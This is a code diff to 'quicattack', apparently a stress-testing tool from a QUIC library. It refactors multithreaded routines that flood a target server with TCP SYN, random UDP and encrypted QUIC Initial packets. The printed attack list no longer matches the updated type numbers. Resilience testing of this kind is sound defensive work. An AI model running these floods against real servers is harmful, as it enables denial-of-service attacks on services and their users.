@@ -13,37 +13,18 @@
 
 #include "precomp.h" // from 'core' dir
 #include "msquichelper.h"
-
 #include "packet_writer.h"
 
+//========================================Vars/Consts========================================
 #define US_TO_MS(x) ((x) / 1000)
-
 #define QUIC_MIN_INITIAL_LENGTH 1200
-
 #define ATTACK_TIMEOUT_DEFAULT_MS (60 * 1000)
-
 #define ATTACK_THREADS_DEFAULT CxPlatProcActiveCount()
-
 #define ATTACK_PORT_DEFAULT 443
-
-#if DEBUG
-void printf_buf(const char* name, void* buf, uint32_t len)
-{
-    printf("%s: ", name);
-    for (uint32_t i = 0; i < len; i++) {
-        printf("%.2X", ((uint8_t*)buf)[i]);
-    }
-    printf("\n");
-}
-#else
-#define printf_buf(name, buf, len)
-#endif
-
 const QUIC_HKDF_LABELS HkdfLabels = { "quic key", "quic iv", "quic hp", "quic ku" };
 
 static CXPLAT_DATAPATH* Datapath;
 static PacketWriter* Writer;
-
 static uint32_t AttackType;
 static const char* ServerName;
 static const char* IpAddress;
@@ -52,11 +33,11 @@ static uint64_t TimeoutMs = ATTACK_TIMEOUT_DEFAULT_MS;
 static uint32_t ThreadCount = ATTACK_THREADS_DEFAULT;
 static const char* Alpn = "h3-29";
 static uint32_t Version = QUIC_VERSION_DRAFT_29;
-
 static uint64_t TimeStart;
 static int64_t TotalPacketCount;
 static int64_t TotalByteCount;
 
+//========================================Helpers========================================
 void PrintUsage()
 {
     printf("quicattack is used for generating attack traffic towards a designated server.\n\n");
@@ -70,10 +51,10 @@ void PrintUsageList()
 {
     printf("The following are the different types of attacks supported by the tool.\n\n");
 
-    printf("#0 - TCP Syn packets.\n");
-    printf("#1 - Random UDP 1 byte UDP packets.\n");
-    printf("#2 - Random UDP full length UDP packets.\n");
-    printf("#3 - Random QUIC Initial packets.\n");
+    printf("#0 - Random TCP syn packets.\n");
+    printf("#1 - Random UDP 1 byte packets.\n");
+    printf("#2 - Random UDP full length packets.\n");
+    printf("#3 - Random QUIC initial packets.\n");
     printf("#4 - Valid QUIC initial packets.\n");
 }
 
@@ -97,7 +78,6 @@ struct StrBuffer
     ~StrBuffer() { delete [] Data; }
 };
 
-
 //========================================Callbacks========================================
 _IRQL_requires_max_(DISPATCH_LEVEL)
 _Function_class_(CXPLAT_DATAPATH_RECEIVE_CALLBACK)
@@ -108,7 +88,6 @@ UdpRecvCallback(
     _In_ CXPLAT_RECV_DATA* RecvBufferChain
     )
 {
-    printf("Inside of the UdpRecvCallback().\n");
     CxPlatRecvDataReturn(RecvBufferChain);
 }
 
@@ -142,35 +121,33 @@ ResolveRouteComplete(
     }
 }
 
-//=======================================================================================
 
-void RunAttackRandom(CXPLAT_SOCKET* Binding, uint16_t Length, bool ValidQuic)
-{   
-    CXPLAT_ROUTE Route = {0};
-    CxPlatSocketGetLocalAddress(Binding, &Route.LocalAddress);
-    CxPlatSocketGetRemoteAddress(Binding, &Route.RemoteAddress);
-    QUIC_STATUS Status = CxPlatResolveRoute(Binding, &Route, 0, &Route, ResolveRouteComplete);
-    if (QUIC_FAILED(Status)) {
-        printf("CxPlatResolveRoute failed, 0x%x\n", Status);
-        return;
-    }
-
+//========================================Attacks========================================
+void RunAttackRandom(CXPLAT_SOCKET* Binding, uint16_t Length, bool ValidQuic, bool TCP = false)
+{
     uint64_t ConnectionId = 0;
     CxPlatRandom(sizeof(ConnectionId), &ConnectionId);
 
+    CXPLAT_ROUTE Route = {0};
+    CxPlatSocketGetLocalAddress(Binding, &Route.LocalAddress);
+    CxPlatSocketGetRemoteAddress(Binding, &Route.RemoteAddress);
+    if (QUIC_FAILED(CxPlatResolveRoute(Binding, &Route, 0, &Route, ResolveRouteComplete))) {
+        printf("CxPlatResolveRoute failed!\n");
+        return;
+    }
+
     CXPLAT_SEND_CONFIG SendConfig = { &Route, Length, CXPLAT_ECN_NON_ECT, 0 };
     CXPLAT_SEND_DATA* SendData;
+    QUIC_BUFFER* SendBuffer;
 
     while (CxPlatTimeDiff64(TimeStart, CxPlatTimeMs64()) < TimeoutMs) {
         if ((SendData = CxPlatSendDataAlloc(Binding, &SendConfig)) == nullptr) {
             continue;
         }
         do {
-            QUIC_BUFFER* SendBuffer = CxPlatSendDataAllocBuffer(SendData, Length);
-            if (SendBuffer == nullptr) {
-                printf("CxPlatSendDataAllocBuffer failed\n");
+            if ((SendBuffer = CxPlatSendDataAllocBuffer(SendData, Length)) == nullptr) {
                 CxPlatSendDataFree(SendData);
-                return;
+                continue;
             }
 
             CxPlatRandom(Length, SendBuffer->Buffer);
@@ -193,30 +170,35 @@ void RunAttackRandom(CXPLAT_SOCKET* Binding, uint16_t Length, bool ValidQuic)
                     Header->DestCid + 18);
             }
 
-            InterlockedExchangeAdd64(&TotalPacketCount, 1);
-            InterlockedExchangeAdd64(&TotalByteCount, Length);
         } while (!CxPlatSendDataIsFull(SendData));
 
-        Route.LocalAddress.Ipv4.sin_port++;
-        VERIFY(
-        QUIC_SUCCEEDED(
         CxPlatSocketSend(
             Binding,
             &Route,
-            SendData)));
-        CxPlatSendDataFree(SendData);
+            SendData);
+        InterlockedExchangeAdd64(&TotalPacketCount, 1);
+        InterlockedExchangeAdd64(&TotalByteCount, Length);
+
+        if (TCP) {
+            CxPlatSendDataFree(SendData);
+            Route.LocalAddress.Ipv4.sin_port++;
+        }
     }
 }
 
-void RunAttackValidInitial(CXPLAT_SOCKET* Binding)
+void RunAttackQuic(CXPLAT_SOCKET* Binding)
 {
     const StrBuffer InitialSalt("afbfec289993d24c9e9786f19c6111e04390a899");
-    const uint16_t DatagramLength = QUIC_MIN_INITIAL_LENGTH;
+    const uint16_t Length = QUIC_MIN_INITIAL_LENGTH;
     const uint64_t PacketNumber = 0;
 
     CXPLAT_ROUTE Route = {0};
     CxPlatSocketGetLocalAddress(Binding, &Route.LocalAddress);
-    Route.RemoteAddress = ServerAddress;
+    CxPlatSocketGetRemoteAddress(Binding, &Route.RemoteAddress);
+    if (QUIC_FAILED(CxPlatResolveRoute(Binding, &Route, 0, &Route, ResolveRouteComplete))) {
+        printf("CxPlatResolveRoute failed!\n");
+        return;
+    }
 
     uint8_t Packet[512] = {0};
     uint16_t PacketLength, HeaderLength;
@@ -246,23 +228,23 @@ void RunAttackValidInitial(CXPLAT_SOCKET* Binding)
     CxPlatRandom(sizeof(uint64_t), DestCid);
     CxPlatRandom(sizeof(uint64_t), SrcCid);
 
+    CXPLAT_SEND_DATA* SendData;
+    QUIC_BUFFER* SendBuffer;
+
     while (CxPlatTimeDiff64(TimeStart, CxPlatTimeMs64()) < TimeoutMs) {
-
-        CXPLAT_SEND_CONFIG SendConfig = { &Route, DatagramLength, CXPLAT_ECN_NON_ECT, 0 };
-        CXPLAT_SEND_DATA* SendData = CxPlatSendDataAlloc(Binding, &SendConfig);
-        VERIFY(SendData);
-
-        while (CxPlatTimeDiff64(TimeStart, CxPlatTimeMs64()) < TimeoutMs &&
-            !CxPlatSendDataIsFull(SendData)) {
-            QUIC_BUFFER* SendBuffer =
-                CxPlatSendDataAllocBuffer(SendData, DatagramLength);
-            VERIFY(SendBuffer);
+        CXPLAT_SEND_CONFIG SendConfig = { &Route, Length, CXPLAT_ECN_NON_ECT, 0 };
+        if ((SendData = CxPlatSendDataAlloc(Binding, &SendConfig)) == nullptr) {
+            continue;
+        }
+        do {
+            if ((SendBuffer = CxPlatSendDataAllocBuffer(SendData, Length)) == nullptr) {
+                CxPlatSendDataFree(SendData);
+                continue;
+            }
 
             (*DestCid)++; (*SrcCid)++;
             *OrigSrcCid = *SrcCid;
             memcpy(SendBuffer->Buffer, Packet, PacketLength);
-
-            printf_buf("cleartext", SendBuffer->Buffer, PacketLength - CXPLAT_ENCRYPTION_OVERHEAD);
 
             QUIC_PACKET_KEY* WriteKey;
             VERIFY(
@@ -276,9 +258,6 @@ void RunAttackValidInitial(CXPLAT_SOCKET* Binding)
                 nullptr,
                 &WriteKey)));
 
-            printf_buf("salt", InitialSalt.Data, InitialSalt.Length);
-            printf_buf("cid", DestCid, sizeof(uint64_t));
-
             uint8_t Iv[CXPLAT_IV_LENGTH];
             QuicCryptoCombineIvAndPacketNumber(
                 WriteKey->Iv, (uint8_t*)&PacketNumber, Iv);
@@ -291,17 +270,12 @@ void RunAttackValidInitial(CXPLAT_SOCKET* Binding)
                 PacketLength - HeaderLength,
                 SendBuffer->Buffer + HeaderLength);
 
-            printf_buf("encrypted", SendBuffer->Buffer, PacketLength);
-
             uint8_t HpMask[16];
             CxPlatHpComputeMask(
                 WriteKey->HeaderKey,
                 1,
                 SendBuffer->Buffer + HeaderLength,
                 HpMask);
-
-            printf_buf("cipher_text", SendBuffer->Buffer + HeaderLength, 16);
-            printf_buf("hp_mask", HpMask, 16);
 
             QuicPacketKeyFree(WriteKey);
 
@@ -310,21 +284,18 @@ void RunAttackValidInitial(CXPLAT_SOCKET* Binding)
                 SendBuffer->Buffer[PacketNumberOffset + i] ^= HpMask[i + 1];
             }
 
-            printf_buf("protected", SendBuffer->Buffer, PacketLength);
+        } while (!CxPlatSendDataIsFull(SendData));
 
-            InterlockedExchangeAdd64(&TotalPacketCount, 1);
-            InterlockedExchangeAdd64(&TotalByteCount, DatagramLength);
-        }
-
-        VERIFY(
-        QUIC_SUCCEEDED(
         CxPlatSocketSend(
             Binding,
             &Route,
-            SendData)));
+            SendData);
+        InterlockedExchangeAdd64(&TotalPacketCount, 1);
+        InterlockedExchangeAdd64(&TotalByteCount, Length);
     }
 }
 
+//========================================Flow========================================
 CXPLAT_THREAD_CALLBACK(RunAttackThread, /* Context */)
 {
     CXPLAT_SOCKET* Binding;
@@ -346,19 +317,22 @@ CXPLAT_THREAD_CALLBACK(RunAttackThread, /* Context */)
 
     switch (AttackType) {
     case 0:
-        RunAttackRandom(Binding, 1, false);
+        RunAttackRandom(Binding, 1, false, true);
         break;
     case 1:
-        RunAttackRandom(Binding, 1, false);
+        RunAttackRandom(Binding, QUIC_MIN_INITIAL_LENGTH, false, true);
         break;
     case 2:
-        RunAttackRandom(Binding, QUIC_MIN_INITIAL_LENGTH, false);
+        RunAttackRandom(Binding, 1, false);
         break;
     case 3:
-        RunAttackRandom(Binding, QUIC_MIN_INITIAL_LENGTH, true);
+        RunAttackRandom(Binding, QUIC_MIN_INITIAL_LENGTH, false);
         break;
     case 4:
-        RunAttackValidInitial(Binding);
+        RunAttackRandom(Binding, QUIC_MIN_INITIAL_LENGTH, true);
+        break;
+    case 5:
+        RunAttackQuic(Binding);
         break;
     default:
         break;
@@ -409,95 +383,72 @@ main(
     _In_reads_(argc) _Null_terminated_ char* argv[]
     )
 {
-    int ErrorCode = -1;
     if (argc < 2) {
         PrintUsage();
-        goto Error;
+        return -1;
     }
-
-    if (strcmp("-list", argv[1]) == 0) {
+    else if (strcmp("-list", argv[1]) == 0) {
         PrintUsageList();
-        ErrorCode = 0;
-
+        return 0;
+    }
+    else if (!TryGetValue(argc, argv, "type", &AttackType) ||
+    (AttackType < 0 || AttackType > 5)) {
+        PrintUsage();
+        return -1;
     } else {
-        if (!TryGetValue(argc, argv, "type", &AttackType)) {
-            PrintUsage();
-            goto Error;
-        }
-
-        if (AttackType < 0 || AttackType > 4) {
-            printf("Invalid -type:'%u' specified!\n", AttackType);
-            goto Error;
-        }
-
         TryGetValue(argc, argv, "ip", &IpAddress);
         TryGetValue(argc, argv, "alpn", &Alpn);
         TryGetValue(argc, argv, "sni", &ServerName);
         TryGetValue(argc, argv, "timeout", &TimeoutMs);
         TryGetValue(argc, argv, "threads", &ThreadCount);
-
-            const CXPLAT_UDP_DATAPATH_CALLBACKS DatapathCallbacks = {
+    }
+    
+    const CXPLAT_UDP_DATAPATH_CALLBACKS DatapathCallbacks = {
         UdpRecvCallback,
         UdpUnreachCallback,
     };
-    QUIC_EXECUTION_CONFIG DatapathFlags = {
-        QUIC_EXECUTION_CONFIG_FLAG_QTIP,
+    QUIC_EXECUTION_CONFIG DatapathFlags = { 
+        ((AttackType == 0 || AttackType == 1) ? QUIC_EXECUTION_CONFIG_FLAG_QTIP : QUIC_EXECUTION_CONFIG_FLAG_NONE),
     };
-    
     CxPlatSystemLoad();
     CxPlatInitialize();
-
-    if (AttackType == 0) {
-        CxPlatDataPathInitialize(
-            0,
-            &DatapathCallbacks,
-            NULL,
-            &DatapathFlags,
-            &Datapath);
-    } else {
-        CxPlatDataPathInitialize(
-            0,
-            &DatapathCallbacks,
-            NULL,
-            NULL,
-            &Datapath);
-    }
-
-        if (IpAddress == nullptr) {
-            if (ServerName == nullptr) {
-                printf("'ip' or 'sni' must be specified!\n");
-                goto Error;
-            }
-            if (QUIC_FAILED(
-                CxPlatDataPathResolveAddress(
-                    Datapath,
-                    ServerName,
-                    &ServerAddress))) {
-                printf("Failed to resolve IP address of '%s'.\n", ServerName);
-                goto Error;
-            }
+    CxPlatDataPathInitialize(
+        0,
+        &DatapathCallbacks,
+        NULL,
+        &DatapathFlags,
+        &Datapath);
+    
+    if (IpAddress == nullptr) {
+        if (ServerName == nullptr) {
+            printf("'ip' or 'sni' must be specified!\n");
+            return -1;
+        }
+        if (QUIC_FAILED(
+            CxPlatDataPathResolveAddress(
+                Datapath,
+                ServerName,
+                &ServerAddress))) {
+                    printf("Failed to resolve IP address of '%s'.\n", ServerName);
+                    return -1;
+        }
             QuicAddrSetPort(&ServerAddress, ATTACK_PORT_DEFAULT);
-        } else {
-            if (!QuicAddrFromString(IpAddress, ATTACK_PORT_DEFAULT, &ServerAddress)) {
-                printf("Invalid -ip:'%s' specified!\n", IpAddress);
-                goto Error;
-            }
+    } else {
+        if (!QuicAddrFromString(IpAddress, ATTACK_PORT_DEFAULT, &ServerAddress)) {
+            printf("Invalid -ip:'%s' specified!\n", IpAddress);
+            return -1;
         }
-
-        if (ServerAddress.Ipv4.sin_port == 0) {
-            printf("A UDP port must be specified with the IP address.\n");
-            goto Error;
-        }
-
-        RunAttack();
-        ErrorCode = 0;
     }
 
-Error:
+    if (ServerAddress.Ipv4.sin_port == 0) {
+        printf("A port must be specified with the IP address.\n");
+        return -1;
+    }
+    
+    RunAttack();
 
     CxPlatDataPathUninitialize(Datapath);
     CxPlatUninitialize();
     CxPlatSystemUnload();
-
-    return ErrorCode;
+    return 0;
 }
